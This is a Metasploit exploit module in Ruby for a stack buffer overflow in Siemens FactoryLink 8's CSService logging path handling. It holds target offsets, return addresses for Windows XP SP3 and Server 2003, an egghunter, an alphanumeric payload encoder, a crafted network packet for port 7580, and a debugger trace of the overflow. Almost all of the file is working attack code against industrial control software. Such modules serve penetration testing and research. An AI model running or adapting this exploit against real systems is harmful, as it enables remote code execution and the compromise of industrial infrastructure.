##
# $Id: factorylink_csservice.rb 13019 2011-06-25 00:54:18Z sinn3r $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::Tcp
    include Msf::Exploit::Egghunter
 
    def initialize(info={})
        super(update_info(info,
            'Name'           => "Siemens FactoryLink 8 CSService Logging Path Param Buffer Overflow",
            'Description'    => %q{
                    This module exploits a vulnerability found on Siemens FactoryLink 8. The
                vulnerability occurs when CSService.exe processes a CSMSG_ListFiles_REQ message,
                the user-supplied path first gets converted to ANSI format (CodePage 0), and then
                gets handled by a logging routine where proper bounds checking is not done,
                therefore causing a stack-based buffer overflow, and results arbitrary code execution.
            },
            'License'        => MSF_LICENSE,
            'Version'        => "$Revision: 13019 $",
            'Author'         =>
                [
                    'Luigi Auriemma <aluigi[at]autistici.org>',  #Initial discovery, poc
                    'sinn3r',  #Metasploit (thx hal)
                ],
            'References'     =>
                [
                    ['URL', 'http://aluigi.altervista.org/adv/factorylink_1-adv.txt'],
                ],
            'Payload'        =>
                {
                    'BadChars' => "\x00\x80\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8e\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9e\x9f",
                    'StackAdjustment' => -3500,
                    'EncoderType' => Msf::Encoder::Type::AlphanumMixed,
                    'EncoderOptions' => {'BufferRegister'=>'ECX'},
                },
            'DefaultOptions'  =>
                {
                    'ExitFunction' => "process",
                },
            'Platform'       => 'win',
            'Targets'        =>
                [
                    [
                        'Windows XP SP3',
                        {
                            'Offset' => 965,         #Offset to overwrite RETN
                            'Ret'    => 0x7e4456f7,  #JMP ESP in USER32.dll
                            'Max'    => 1400,        #Max buffer used
                        }
                    ],
                    [
                        'Windows Server 2003 SP0',
                        {
                            'Offset' => 965,
                            'Ret'    => 0x77d20738,  #JMP ESP in USER32.dll
                            'Max'    => 1400,
                        }
                    ]
                ],
            'Privileged'     => false,
            'DisclosureDate' => "Mar 25 2011"))
 
            register_options(
                [
                    Opt::RPORT(7580)
                ], self.class)
    end
 
    #User input will get converted back to ANSCI with WideCharToMultiByte before vsprintf
    def to_unicode(text)
        output = ''
        (text.length).times do |i|
            output << text[i,1] << "\x00"
        end
        return output
    end
 
    def exploit
 
        #Modify payload
        #XP = Align EAX 0x3a bytes.  Win2k3SP0 = 0x0a bytes
        p  = "\x57"      #PUSH EDI
        p << "\x59"      #POP ECX
        p << ((target.name =~ /server 2003/i) ? "\xb0\x0a" : "\xb0\x3a")
        p << "\x30\xc1"  #XOR CL,AL
        p << payload.encoded
 
        #Meterpreter tends to fail because of it being mangled.  We use an egghunter
        #instead to ensure the payload's integrity.
        egg_options =
        {
            :checksum => true,
            :eggtag   => "W00T",
        }
 
        egghunter, p = generate_egghunter(p, payload_badchars, egg_options)
 
        #x86/alpha_mixed egghunter
        alpha_encoder = framework.encoders.create("x86/alpha_mixed")
        alpha_encoder.datastore.import_options_from_hash( {'BufferRegister'=>'ESP'} )
        egghunter = alpha_encoder.encode(egghunter, nil, nil, platform)
 
        sploit  = ''
        sploit << make_nops(4)
        sploit << p
        sploit << rand_text_alpha(965-sploit.length)
        sploit << [target.ret].pack('V*')
        sploit << egghunter
 
        sploit << rand_text_alpha(target['Max']-sploit.length)
        sploit = to_unicode(sploit)
 
        pkt  = "\x00\x00\x4c\x45\x4e\x00\x40\x0b\x00\x00\x00\x00\x00\x00\x99\x00\x00\x00\x04\x00"
        pkt << "\x00\x00\x01\x07\x00\x00\x0b\x31\x99\x62\x72\x6b\x01\x00\x00\x00\x02\x04\x00\x00"
        pkt << "\x00\x04\x00\x00\x00\x01\x07\x00\x00\x0b\x19\x99\x00\x00\x00\x06\x00\x00\x00\x03"
        pkt << "\x06\x00\x00\x0a\xf6\x11\x22\x33\x44"
        pkt << sploit
        pkt << "\x00\x00\x06\x00\x00\x00\x06\x11\x22\x33\x44\x00\x00\x04\x00\x00\x00\x04\x00\x00"
        pkt << "\x00\x01\x99\x99\x99"
 
        print_status("Sending malicious request to remote host...")
 
        connect
        sock.put(pkt)
        handler
        select(nil, nil, nil, 6)
        disconnect
    end
end
 
=begin
0:000> g
call vsprintf. Destination=0x0012ead0 Format=0x0043b92c Args=0x0012eedc
eax=0012eedc ebx=7c809a99 ecx=0043b92c edx=0012ead0 esi=0012eee8 edi=00000002
eip=0040b908 esp=0012eac4 ebp=0012fabc iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
CSService+0xb908:
0040b908 ff15249b4400    call    dword ptr [CSService+0x49b24 (00449b24)] ds:0023:00449b24={msvcrt!vsprintf (77c3fe49)}
 
0:000> dc 0012ead0
0012ead0  65535343 63697672 43203a65 47534d53  CSService: CSMSG
0012eae0  73694c5f 6c694674 525f7365 2d205145  _ListFiles_REQ -
0012eaf0  6f685320 72694477 2c303d73 6c694620   ShowDirs=0, Fil
0012eb00  3d726574 6150202c 613d6874 61616161  ter=, Path=aaaaa
0012eb10  61616161 61616161 61616161 61616161  aaaaaaaaaaaaaaaa
0012eb20  61616161 61616161 61616161 61616161  aaaaaaaaaaaaaaaa
0012eb30  61616161 61616161 61616161 61616161  aaaaaaaaaaaaaaaa
0012eb40  61616161 61616161 61616161 61616161  aaaaaaaaaaaaaaaa
 
=end
